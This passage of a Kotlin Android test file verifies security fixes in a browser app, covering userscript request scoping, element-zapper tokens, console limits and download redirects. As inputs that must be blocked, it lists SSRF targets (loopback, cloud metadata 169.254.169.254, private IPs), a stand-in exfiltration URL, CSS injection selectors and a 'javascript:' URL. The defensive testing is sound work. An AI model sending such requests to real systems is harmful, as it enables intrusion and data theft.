            "F3-02: GM_xmlhttpRequest shim must strip sensitive Cookie and Authorization headers",
            gmShim.contains("lk !== 'cookie'") && gmShim.contains("lk !== 'authorization'")
        )

        assertTrue(
            "F3-02: GM_xmlhttpRequest must allow target host within extension matches scope",
            extMgr.isAllowedGmXhrUrl(
                targetUrl = "https://sub.api.example.com/v1/data",
                pageUrl = "https://other.org/article",
                extensionMatches = listOf("api.example.com")
            )
        )
        assertTrue(
            "F3-02: GM_xmlhttpRequest must allow same-origin request matching current page host",
            extMgr.isAllowedGmXhrUrl(
                targetUrl = "https://news.example.org/api/items",
                pageUrl = "https://news.example.org/home",
                extensionMatches = listOf("other.com")
            )
        )
        assertFalse(
            "F3-02: GM_xmlhttpRequest must block request outside extension host scope and page origin",
            extMgr.isAllowedGmXhrUrl(
                targetUrl = "https://unrelated-exfil.xyz/collect",
                pageUrl = "https://news.example.org/home",
                extensionMatches = listOf("api.example.com")
            )
        )
        assertFalse(
            "F3-02: GM_xmlhttpRequest must block SSRF to loopback 127.0.0.1 even with wildcard scope",
            extMgr.isAllowedGmXhrUrl(
                targetUrl = "http://127.0.0.1:8080/admin",
                pageUrl = "https://news.example.org",
                extensionMatches = listOf("*")
            )
        )
        assertFalse(
            "F3-02: GM_xmlhttpRequest must block SSRF to cloud metadata 169.254.169.254",
            extMgr.isAllowedGmXhrUrl(
                targetUrl = "http://169.254.169.254/latest/meta-data/",
                pageUrl = "https://news.example.org",
                extensionMatches = listOf("*")
            )
        )
        assertFalse(
            "F3-02: GM_xmlhttpRequest must block SSRF to IPv6 ULA [fd00::1]",
            extMgr.isAllowedGmXhrUrl(
                targetUrl = "http://[fd00::1]/internal",
                pageUrl = "https://news.example.org",
                extensionMatches = listOf("*")
            )
        )

        // ── F3-03: Element Zapper Per-Session Token & Selector Re-Validation ──
        vm.setElementZapperActive(false)
        assertEquals("F3-03: Session token must be empty when Element Zapper is inactive", "", vm.zapperSessionToken.value)
        assertFalse(
            "F3-03: verifyAndSelectZapperElement must reject calls when Element Zapper is inactive",
            vm.verifyAndSelectZapperElement("fake-token", "div.ad-banner", "div")
        )

        vm.setElementZapperActive(true)
        val activeToken = vm.zapperSessionToken.value
        assertTrue("F3-03: Activating Element Zapper must generate a non-empty secret session token", activeToken.isNotBlank())

        assertFalse(
            "F3-03: verifyAndSelectZapperElement must reject untrusted calls with wrong or missing token",
            vm.verifyAndSelectZapperElement("wrong-token", "div.ad-banner", "div")
        )
        assertFalse(
            "F3-03: verifyAndSelectZapperElement must reject root element 'body' even with valid token",
            vm.verifyAndSelectZapperElement(activeToken, "body", "body")
        )
        assertFalse(
            "F3-03: verifyAndSelectZapperElement must reject CSS breakout injection even with valid token",
            vm.verifyAndSelectZapperElement(activeToken, "div { display:none }", "div")
        )
        assertTrue(
            "F3-03: verifyAndSelectZapperElement must accept valid selector with matching session token",
            vm.verifyAndSelectZapperElement(activeToken, "div.floating-promo-box", "div")
        )
        assertEquals("div.floating-promo-box", vm.zapperPreviewSelector.value)

        // Verify addCustomZapperRule re-validates selector on Kotlin side
        vm.clearCustomZapperRulesForHost("example.com")
        vm.addCustomZapperRule("example.com", "body { background: red }")
        vm.addCustomZapperRule("example.com", "html")
        assertTrue(
            "F3-03: addCustomZapperRule must reject dangerous or root selectors",
            vm.getCustomZapperRulesForHost("example.com").isEmpty()
        )
        vm.addCustomZapperRule("example.com", "div.sponsored-widget")
        assertEquals(
            "F3-03: addCustomZapperRule must persist valid selector",
            listOf("div.sponsored-widget"),
            vm.getCustomZapperRulesForHost("example.com")
        )
        vm.setElementZapperActive(false)

        // ── F3-04: AdBlockDevTools Console Flooding, Size Truncation, & Inspect Gate ──
        val testTabId = vm.tabs.value.first().id
        vm.clearConsole(testTabId)
        vm.setInspectToolsEnabled(false)
        vm.addConsoleEntry(
            testTabId,
            com.example.devtools.ConsoleEntry(
                id = "ignored-1",
                timestamp = System.currentTimeMillis(),
                level = com.example.devtools.ConsoleLevel.LOG,
                message = "Should be ignored when inspectToolsEnabled is false"
            )
        )
        assertTrue(
            "F3-04: addConsoleEntry must ignore messages when inspectToolsEnabled is false",
            vm.devToolsStates.value[testTabId]?.consoleEntries.isNullOrEmpty()
        )

        vm.setInspectToolsEnabled(true)
        val hugeMessage = "X".repeat(10_000)
        for (i in 1..100) {
            vm.addConsoleEntry(
                testTabId,
                com.example.devtools.ConsoleEntry(
                    id = "msg-$i",
                    timestamp = System.currentTimeMillis(),
                    level = com.example.devtools.ConsoleLevel.LOG,
                    message = hugeMessage
                )
            )
        }
        val recordedEntries = vm.devToolsStates.value[testTabId]?.consoleEntries.orEmpty()
        assertTrue(
            "F3-04: Console rate limiter must cap burst of 100 messages in 1s to <= ${com.example.ui.viewmodel.BrowserViewModel.MAX_CONSOLE_ENTRIES_PER_SECOND}",
            recordedEntries.isNotEmpty() && recordedEntries.size <= com.example.ui.viewmodel.BrowserViewModel.MAX_CONSOLE_ENTRIES_PER_SECOND
        )
        assertEquals(
            "F3-04: Oversized console message must be truncated to MAX_CONSOLE_MESSAGE_LENGTH (2000)",
            com.example.ui.viewmodel.BrowserViewModel.MAX_CONSOLE_MESSAGE_LENGTH,
            recordedEntries.first().message.length
        )
        vm.setInspectToolsEnabled(false)

        // ── F3-05: Download Redirect Validation & Cross-Origin Cookie Scope ──
        assertTrue(
            "F3-05: HTTPS to HTTPS public redirect hop must be allowed",
            com.example.manager.AppDownloadManager.isSafeRedirectHop(
                "https://releases.example.com/v1/app.apk",
                "https://cdn.example.com/files/app.apk",
                resolveDns = false
            )
        )
        assertFalse(
            "F3-05: HTTPS to HTTP downgrade redirect hop must be rejected",
            com.example.manager.AppDownloadManager.isSafeRedirectHop(
                "https://releases.example.com/v1/app.apk",
                "http://cdn.example.com/files/app.apk",
                resolveDns = false
            )
        )
        assertFalse(
            "F3-05: Redirect hop to private/loopback address must be rejected",
            com.example.manager.AppDownloadManager.isSafeRedirectHop(
                "https://releases.example.com/v1/app.apk",
                "https://127.0.0.1/secret",
                resolveDns = false
            )
        )
    }

    @Test
    fun testFase4AuditFixesVerification() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()

        // ── F4-01: Download Pipeline Consolidation & Safe Delegation ──
        // 1. Unsafe URLs blocked immediately without invoking download manager
        com.example.manager.DownloadHelper.downloadFile(
            context = context,
            url = "http://127.0.0.1/private.zip",
            userAgent = "AlexBrowserTest",
            contentDisposition = "",
            mimeType = "application/zip",
            downloadAcceleration = "Fast",
            isIncognito = false,
            appDownloadManager = null
        )

        // 2. Range check safely rejects invalid / SSRF target URLs without crashing
        kotlinx.coroutines.runBlocking {
            val unsafeResult = com.example.manager.DownloadHelper.checkAcceptRanges("http://192.168.1.1/router.bin", "AlexBrowserTest")
            assertFalse("F4-01: checkAcceptRanges must safely reject SSRF target URLs", unsafeResult)
        }

        // 3. Delegation to AppDownloadManager when provided
        val db = com.example.data.AppDatabase.getDatabase(context)
        val repo = com.example.data.DownloadRepository(db.downloadDao())
        val testScope = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO)
        val adm = com.example.manager.AppDownloadManager(context, repo, testScope)

        com.example.manager.DownloadHelper.downloadFile(
            context = context,
            url = "https://example.com/test-bundle.zip",
            userAgent = "AlexBrowserTest",
            contentDisposition = "attachment; filename=\"test-bundle.zip\"",
            mimeType = "application/zip",
            downloadAcceleration = "Fast",
            isIncognito = true,
            appDownloadManager = adm
        )
        // Verify active downloads in AppDownloadManager received the queued job
        val activeMap = adm.activeDownloads.value
        assertTrue(
            "F4-01: DownloadHelper fast mode must delegate to AppDownloadManager when supplied",
            activeMap.values.any { it.url == "https://example.com/test-bundle.zip" && it.isIncognito }
        )

        // ── F4-02: String Resource Externalization Verification ──
        val sBlocked = context.getString(R.string.download_blocked_unsafe)
        assertTrue("F4-02: download_blocked_unsafe must not be blank", sBlocked.isNotBlank())

        val sWarning = context.getString(R.string.download_warning_dangerous_file)
        assertTrue("F4-02: download_warning_dangerous_file must not be blank", sWarning.isNotBlank())

        val sFast = context.getString(R.string.download_fast_accelerated)
        assertTrue("F4-02: download_fast_accelerated must not be blank", sFast.isNotBlank())

        val sFallback = context.getString(R.string.download_range_fallback_normal)
        assertTrue("F4-02: download_range_fallback_normal must not be blank", sFallback.isNotBlank())

        val sDownloading = context.getString(R.string.downloading_file)
        assertTrue("F4-02: downloading_file must not be blank", sDownloading.isNotBlank())

        val sFailed = context.getString(R.string.download_failed_prefix, "Network Timeout")
        assertTrue("F4-02: download_failed_prefix format must contain argument", sFailed.contains("Network Timeout"))

        val sExtPrivActive = context.getString(R.string.extension_tab_private_active)
        assertTrue("F4-02: extension_tab_private_active must not be blank", sExtPrivActive.isNotBlank())

        val sExtPrivInactive = context.getString(R.string.extension_tab_private_inactive)
        assertTrue("F4-02: extension_tab_private_inactive must not be blank", sExtPrivInactive.isNotBlank())

        val sExtPinned = context.getString(R.string.extension_pinned)
        assertTrue("F4-02: extension_pinned must not be blank", sExtPinned.isNotBlank())

        val sExtUnpinned = context.getString(R.string.extension_unpinned)
        assertTrue("F4-02: extension_unpinned must not be blank", sExtUnpinned.isNotBlank())

        val sExtDeleted = context.getString(R.string.extension_deleted, "AdBlock Plus")
        assertTrue("F4-02: extension_deleted format must contain extension name", sExtDeleted.contains("AdBlock Plus"))

        val sConsoleRate = context.getString(R.string.console_rate_limit_exceeded)
        assertTrue("F4-02: console_rate_limit_exceeded must not be blank", sConsoleRate.isNotBlank())

        val sZapperRoot = context.getString(R.string.zapper_root_element_blocked)
        assertTrue("F4-02: zapper_root_element_blocked must not be blank", sZapperRoot.isNotBlank())

        val sZapperInvalid = context.getString(R.string.zapper_invalid_selector)
        assertTrue("F4-02: zapper_invalid_selector must not be blank", sZapperInvalid.isNotBlank())

        // ── F4-03: Full Multi-Phase Regression Integrity Check ──
        // Fase 1: CSS Selector Validation & Injection Sanitization
        assertFalse("Fase 1 regression: dangerous selector with style tag closing must be blocked", com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".banner</style>"))
        assertFalse("Fase 1 regression: body/html selectors must be blocked", com.example.manager.CosmeticFilterInjector.isSafeCssSelector("body"))
        assertTrue("Fase 1 regression: safe ad slot selector must be allowed", com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-banner"))

        // Fase 2: Scheme & Intent Sanitization
        assertFalse("Fase 2 regression: content:// scheme must be blocked", com.example.manager.SecurityGuardEngine.isSafeWebNavigationUrl("content://media/external/images"))
        assertFalse("Fase 2 regression: javascript: scheme must be blocked", com.example.manager.SecurityGuardEngine.isSafeWebNavigationUrl("javascript:alert(1)"))

        // Fase 3: Extension default flags & token validation
        val importedExts = com.example.manager.BrowserExtensionManager.parseExtensionFromRawText(
            rawText = "// ==UserScript==\n// @name Test\n// @match *://*/*\n// ==/UserScript==",
            fileName = "test.user.js",
            sourceType = com.example.manager.ExtensionSourceType.EXTERNAL_URL,
            sourceUrl = "https://example.com/test.user.js"
        )
        assertTrue("Fase 3 regression: Parsed external extension list should not be empty", importedExts.isNotEmpty())
        assertFalse("Fase 3 regression: External extension allowInPrivate must be false by default", importedExts.first().allowInPrivate)
        assertFalse("Fase 3 regression: External extension isEnabled must be false by default", importedExts.first().isEnabled)
    }
}




